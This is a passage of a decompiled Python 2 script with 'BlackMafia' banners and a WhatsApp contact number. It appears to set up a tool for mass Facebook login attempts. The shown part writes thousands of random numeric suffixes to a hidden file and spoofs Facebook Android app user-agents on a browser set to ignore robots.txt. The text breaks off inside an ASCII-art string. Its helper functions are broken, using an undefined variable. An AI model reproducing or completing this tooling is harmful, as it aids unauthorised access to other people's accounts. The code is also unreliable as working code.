# uncompyle6 version 3.7.3
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jul  8 2020, 22:44:54) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(9990):
    nmbr = random.randint(111, 999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; BAH-W09 Build/HUAWEIBAH-W09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Safari/537.36 [FB_IAB/FB4A;FBAV/154.0.0.29.385;]')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B661094629A90240T1390849P1) like Gecko')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 8.0.0; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B667897245A77460T1297416P1) like Gecko')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 6.0.1; SM-J106H Build/MMB29Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 SamsungBrowser/CrossApp/0.1.90')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B673272004A48129T1390849P1) like Gecko')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 Mailbird/2.5.8.0/ Mailbird/2.5.8.0/')]
br.addheaders = [('user-agent', 'Millennium/20180228 CFNetwork/811.4.18 Darwin/16.5.0')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; VFD 610 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/162.0.0.45.94;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 5.0.2; VF-1497 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; BAH-W09 Build/HUAWEIBAH-W09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Safari/537.36 [FB_IAB/FB4A;FBAV/154.0.0.29.385;]')]

def keluar():
    print 'God by Frends '
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.001)


B = '\x1b[1;94m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
W = '\x1b[1;97m'
S = '\x1b[1;96m'
P = '\x1b[1;95m'
Y = '\x1b[1;93m'
logo = """
      _____                _ _     
     |  ___|              (_) |    
  ___| |__ _ __ ___   __ _ _| |    
 / __|  __| '_ ` _ \ / _` | | |    
| (__| |__| | | | | | (_| | | |____
 \___\____/_| |_| |_|\__,_|_\_____/
                                   
                       """
logo1 = '\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;91m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x96\x95\xe2\x95\xb2\xe2\x94\x8a\xe2\x94\x8a\xe2\x95\xb1\xe2\x96\x8f\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87 B\x1b[1;91m M \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x96\x95\xe2\x95\xb2\xe2\x94\x8a\xe2\x94\x8a\xe2\x95\xb1\xe2\x96\x8f\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x96\x95\xe2\x96\x82\xe2\x95\xb1\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x8f\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87 L\x1b[1;91m A \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x96\x95\xe2\x96\x82\xe2\x95\xb1\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x8f\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x95\xb2\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x95\xb1\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87 A\x1b[1;91m F \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x95\xb2\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x95\xb1\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x82\xe2\x95\xb1\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87 C\x1b[1;91m I \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x95\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x82\xe2\x95\xb1\xe2\x96\x8f\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2\xe2\x96\x87\xe2\x96\x87 K\x1b[1;91m A \xe2\x96\x87\xe2\x96\x87\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87  \x1b[1;91m   \xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;96m\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\x1b[1;91m\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x96\x87\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x94\x88\xe2\x96\x87\xe2\x96\x87\n\x1b[1;93m\xe2\x96\x87\xe2\x96\x87 WhatsApp Num \xe2\x96\x87\xe2\x96\x87\x1b[1;93m     \xe2\x96\x87\xe2\x96\x87  03094161457 \xe2\x96\x87\xe2\x96\x87\n\x1b[1;95m\xc2\xab---------------\x1b[1;91mBlackMafia\x1b[1;95m-----------------\xc2\xbb'
logo3 = '\n\x1b[1;91m\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa2\x80\xe2\xa1\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa2\x80\xe2\xa1\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa3\xa0\xe2\xa1\x96\xe2\xa0\x81\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x88\xe2\xa2\xb2\xe2\xa3\x84\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa3\xbc\xe2\xa1\x8f\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa2\xb9\xe2\xa3\xa7\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa3\xb8\xe2\xa3\xbf\xe2\xa0\x81\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x88\xe2\xa3\xbf\xe2\xa3\x87\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x87\xe2\xa0\x80\xe2\xa2\x80\xe2\xa3\x80\xe2\xa3\xa4\xe2\xa3\xa4\xe2\xa3\xa4\xe2\xa3\xa4\xe2\xa3\x80\xe2\xa1\x80\xe2\xa0\x80\xe2\xa2\xb8\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa2\xbb\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\x94\xe2\xa2\xbf\xe2\xa1\xbf\xe2\xa0\x9f\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\xbb\xe2\xa2\xbf\xe2\xa1\xbf\xe2\xa3\xa2\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x9f\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa3\x80\xe2\xa3\xa4\xe2\xa3\xb6\xe2\xa3\xbe\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xb7\xe2\xa3\xa4\xe2\xa3\x80\xe2\xa1\x80\xe2\xa2\x80\xe2\xa3\x80\xe2\xa3\xa4\xe2\xa3\xbe\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xb7\xe2\xa3\xb6\xe2\xa3\xa4\xe2\xa1\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa2\xa0\xe2\xa3\xbe\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa0\xbf\xe2\xa0\xbf\xe2\xa0\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa0\x8f\xe2\xa0\xbb\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa0\xbf\xe2\xa0\xbf\xe2\xa0\xbf\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xb7\xe2\xa1\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa2\xa0\xe2\xa1\xbf\xe2\xa0\x8b\xe2\xa0\x81\xe2\xa0\x80\xe2\xa0\x80\xe2\xa2\xb8\xe2\xa3\xbf\xe2\xa1\x87\xe2\xa0\x89\xe2\xa0\xbb\xe2\xa3\xbf\xe2\xa0\x87\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\xb8\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa0\x8b\xe2\xa2\xb0\xe2\xa3\xbf\xe2\xa1\x87\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x88\xe2\xa0\x99\xe2\xa2\xbf\xe2\xa1\x84\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa1\xbf\xe2\xa0\x81\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x98\xe2\xa3\xbf\xe2\xa3\xb7\xe2\xa1\x80\xe2\xa0\x80\xe2\xa0\xb0\xe2\xa3\xbf\xe2\xa3\xb6\xe2\xa3\xb6\xe2\xa3\xbf\xe2\xa1\x8e\xe2\xa0\x80\xe2\xa2\x80\xe2\xa3\xbe\xe2\xa3\xbf\xe2\xa0\x87\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x88\xe2\xa2\xbf\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa1\x87\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\xb9\xe2\xa3\xbf\xe2\xa3\xb7\xe2\xa3\x84\xe2\xa0\x80\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa0\x80\xe2\xa3\xa0\xe2\xa3\xbe\xe2\xa3\xbf\xe2\xa0\x8f\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa2\xb8\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x81\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x88\xe2\xa0\xbb\xe2\xa2\xbf\xe2\xa2\x87\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xb8\xe2\xa3\xbf\xe2\xa0\x9f\xe2\xa0\x81\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x88\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa2\x80\xe2\xa3\xbc\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xa7\xe2\xa1\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x90\xe2\xa2\xa4\xe2\xa3\x80\xe2\xa3\x80\xe2\xa2\x80\xe2\xa3\x80\xe2\xa3\xa0\xe2\xa3\xb4\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa0\xbf\xe2\xa0\x8b\xe2\xa0\x99\xe2\xa0\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xa6\xe2\xa3\x84\xe2\xa3\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa3\x80\xe2\xa1\xa0\xe2\xa0\x82\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x88\xe2\xa0\x89\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x89\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x88\xe2\xa0\x89\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x8b\xe2\xa0\x81\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\xe2\xa0\x80\n           BlackMafia\n  WhatsApp          03094161457\n\x1b[1;95m\xc2\xab-----------------\x1b[1;91mBlackMafia\x1b[1;95m-----------------\xc2\xbb'
logo4 = '\n\x1b[1;95m\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa0\x9b\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x89\xe2\xa0\x9b\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa0\x8f\xe2\xa0\x84\xe2\xa2\x80\xe2\xa3\xa0\xe2\xa3\xb6\xe2\xa3\xb6\xe2\xa3\xb6\xe2\xa3\xb6\xe2\xa3\xa4\xe2\xa1\x80\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\xb9\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x8f\xe2\xa0\x84\xe2\xa0\x84\xe2\xa3\xbe\xe2\xa1\xbf\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa1\x86\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xbb\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa0\x83\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xbf\xe2\xa3\x87\xe2\xa3\xb8\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\x87\xe2\xa3\xb8\xe2\xa1\xbf\xe2\xa0\x83\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\xb8\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\xbf\xe2\xa0\x8b\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x89\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x9b\xe2\xa0\x89\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x99\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x9f\xe2\xa0\x81\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x88\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x9f\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\xa0\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x88\xe2\xa2\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x9f\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xa0\xe2\xa3\x86\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa3\xa7\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x88\xe2\xa2\xbf\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa1\x87\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa3\xbe\xe2\xa3\xbf\xe2\xa1\x80\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xb0\xe2\xa3\xbf\xe2\xa3\xa7\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x98\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\x87\xe2\xa0\x84\xe2\xa3\xb0\xe2\xa3\xb6\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xa6\xe2\xa3\x80\xe2\xa1\x80\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\x80\xe2\xa3\xa0\xe2\xa3\xb4\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xb6\xe2\xa3\x86\xe2\xa0\x84\xe2\xa2\x80\xe2\xa3\xbf\n      \xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa0\x8f\xe2\xa0\x84\xe2\xa0\x84\xe2\xa2\xb8\xe2\xa3\xbf\xe2\xa0\x87\xe2\xa0\x84\xe2\xa0\x84\xe2\xa0\xb9\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\xe2\xa3\xbf\n      